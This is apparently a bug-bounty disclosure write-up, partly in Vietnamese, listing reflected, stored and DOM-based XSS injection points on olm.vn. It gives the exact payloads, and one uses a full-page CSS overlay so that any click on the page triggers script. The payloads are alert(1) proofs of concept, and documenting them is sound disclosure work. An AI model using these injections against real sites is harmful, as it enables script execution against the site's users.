# Reflected XSS + DOM Based XSS(Clickjacking) + Stored XSS (BONUS $$$)




## Reflected XSS 

Endpoint : https://olm.vn/lop-3/[xss bypass]

Inject : ```"123=123><img%20src/onerror=alert(1)>123123```

![](/Reflected_XSS.jpg)



## Stored XSS

Endpoint : https://olm.vn/?g=classes.checkuser 

Inject : ```<script>alert(1)</script>```

![](/Stored.jpg)


## DOM Based XSS(Clickjacking)

Endpoint : https://olm.vn/bg?q=[Inject]

Inject : ```'id=x tabindex=1 onfocusin=alert(1) style=color:white;top:-1000px;z-index:10000;height:10000px;width:100000px; class=1"'><h1>vhae&grade=0```

Ở đây ta có `'id=x tabindex=1 onfocusin=alert(1)` nhằm tạo ra xss ở thẻ `<a>`

Đoạn sau là style có cấu trúc chỉnh sửa `css` của thẻ nhằm tạo ra Clickjacking

Khi nạn nhân ấn vào bất kỳ đâu ở web thì sẽ bị xss

![](/Clickjacking.jpg)